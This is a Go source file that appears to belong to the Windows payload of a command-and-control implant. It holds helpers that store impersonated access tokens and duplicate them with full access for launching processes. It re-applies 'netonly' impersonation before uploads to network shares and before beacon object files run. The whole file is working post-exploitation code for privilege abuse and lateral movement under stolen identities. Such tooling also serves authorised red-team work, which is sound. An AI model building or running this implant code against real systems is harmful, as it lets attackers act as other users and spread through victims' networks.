// server/docker/payloads/Windows/token_helpers_windows.go
//go:build windows
// +build windows

package main

import (
	"syscall"
)

// Initialize the global token store for Windows
func initializeWindowsTokenStore() interface{} {
	if globalTokenStore == nil {
		globalTokenStore = &UnifiedTokenStore{
			Tokens:   make(map[string]syscall.Handle),
			Metadata: make(map[string]TokenMetadata),
		}
	}
	return globalTokenStore
}

// IsTokenActiveWindows checks if there's an active token impersonation
func (ctx *CommandContext) IsTokenActiveWindows() bool {
	ctx.mu.RLock()
	defer ctx.mu.RUnlock()

	if ctx.TokenStore == nil {
		return false
	}

	if store, ok := ctx.TokenStore.(*UnifiedTokenStore); ok {
		store.mu.RLock()
		defer store.mu.RUnlock()
		return store.IsImpersonating
	}

	return false
}

// GetActiveTokenWindows gets the active token handle and name
func (ctx *CommandContext) GetActiveTokenWindows() (syscall.Handle, string, bool) {
	ctx.mu.RLock()
	defer ctx.mu.RUnlock()

	if ctx.TokenStore == nil {
		return 0, "", false
	}

	if store, ok := ctx.TokenStore.(*UnifiedTokenStore); ok {
		store.mu.RLock()
		defer store.mu.RUnlock()

		if !store.IsImpersonating || store.ActiveToken == "" {
			return 0, "", false
		}

		if token, exists := store.Tokens[store.ActiveToken]; exists {
			return token, store.ActiveToken, true
		}
	}

	return 0, "", false
}

// GetActiveTokenNameWindows returns the name of the currently active token
func (ctx *CommandContext) GetActiveTokenNameWindows() string {
	ctx.mu.RLock()
	defer ctx.mu.RUnlock()

	if ctx.TokenStore == nil {
		return ""
	}

	if store, ok := ctx.TokenStore.(*UnifiedTokenStore); ok {
		store.mu.RLock()
		defer store.mu.RUnlock()

		if store.IsImpersonating && store.ActiveToken != "" {
			return store.ActiveToken
		}
	}

	return ""
}

// CheckTokenContext is a helper function for commands to check token state
func CheckTokenContext(ctx *CommandContext) (bool, string) {
	if ctx == nil || ctx.TokenStore == nil {
		return false, ""
	}

	if store, ok := ctx.TokenStore.(*UnifiedTokenStore); ok {
		store.mu.RLock()
		defer store.mu.RUnlock()

		if store.IsImpersonating && store.ActiveToken != "" {
			return true, store.ActiveToken
		}
	}

	return false, ""
}

// GetTokenForExecution gets a token suitable for CreateProcessAsUser/CreateProcessWithTokenW
// This duplicates the stored token each time to avoid handle reuse issues
func GetTokenForExecution(ctx *CommandContext) (syscall.Token, bool) {
	if ctx == nil || ctx.TokenStore == nil {
		return 0, false
	}

	store, ok := ctx.TokenStore.(*UnifiedTokenStore)
	if !ok {
		return 0, false
	}

	store.mu.RLock()
	defer store.mu.RUnlock()

	if !store.IsImpersonating || store.ActiveToken == "" {
		return 0, false
	}

	storedToken, exists := store.Tokens[store.ActiveToken]
	if !exists {
		return 0, false
	}

	// IMPORTANT: Always duplicate the token for use
	// This creates a new handle that can be safely closed after use
	var duplicatedToken syscall.Handle
	err := DuplicateTokenEx(
		storedToken,
		TOKEN_ALL_ACCESS,
		nil,
		SecurityImpersonation,
		TokenPrimary, // Primary token for CreateProcessAsUser/CreateProcessWithTokenW
		&duplicatedToken,
	)

	if err != nil {
		// If we can't duplicate as primary, try as impersonation token
		err = DuplicateTokenEx(
			storedToken,
			TOKEN_ALL_ACCESS,
			nil,
			SecurityImpersonation,
			TokenImpersonation,
			&duplicatedToken,
		)
		if err != nil {
			return 0, false
		}
	}

	// Return the duplicated token, which can be safely closed after use
	return syscall.Token(duplicatedToken), true
}

// CleanupToken closes a token handle safely
func CleanupToken(token syscall.Token) {
	if token != 0 && token != syscall.Token(syscall.InvalidHandle) {
		token.Close()
	}
}

// UpdateTokenStore updates the token store reference in the context
// This is useful when the token store is created after the context
func UpdateTokenStore(ctx *CommandContext) {
	if ctx == nil {
		return
	}

	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	if ctx.TokenStore == nil && globalTokenStore != nil {
		ctx.TokenStore = globalTokenStore
	}
}

// EnsureNetworkTokenForUpload ensures network-only token is active for upload operations
// This is called before each chunk operation to handle token loss between beacon callbacks
func EnsureNetworkTokenForUpload(remotePath string) {
	// Only proceed if this is a network path
	if !IsNetworkPath(remotePath) {
		return
	}

	// Check if we have a network-only token set
	if globalTokenStore == nil {
		return
	}

	globalTokenStore.mu.RLock()
	netOnlyHandle := globalTokenStore.NetOnlyHandle
	netOnlyToken := globalTokenStore.NetOnlyToken
	globalTokenStore.mu.RUnlock()

	if netOnlyHandle != 0 && netOnlyToken != "" {
		// Re-apply the impersonation
		// This is necessary because thread impersonation can be lost between beacon callbacks
		err := ImpersonateLoggedOnUser(netOnlyHandle)
		if err != nil {
			// Log warning but don't fail the operation
		} else {
			// Only log this in debug/verbose mode to avoid cluttering output
			// fmt.Printf("[*] Re-applied netonly token for upload to: %s\n", remotePath)
		}
	}
}

// IsNetworkPathForUpload is an exported wrapper for upload operations
func IsNetworkPathForUpload(path string) bool {
	return IsNetworkPath(path)
}

func EnsureTokenContextForBOF() func() {
	if globalTokenStore == nil {
		return func() {} // No-op cleanup
	}

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	var cleanupFunc func()

	// Priority: Network-only token > Regular impersonation
	if globalTokenStore.NetOnlyHandle != 0 {
		err := ImpersonateLoggedOnUser(globalTokenStore.NetOnlyHandle)
		if err == nil {
			cleanupFunc = func() { RevertToSelf() }
		}
	} else if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
		if token, exists := globalTokenStore.Tokens[globalTokenStore.ActiveToken]; exists {
			err := ImpersonateLoggedOnUser(token)
			if err == nil {
				cleanupFunc = func() { RevertToSelf() }
			}
		}
	}

	if cleanupFunc == nil {
		return func() {} // No-op if no impersonation needed
	}

	return cleanupFunc
}
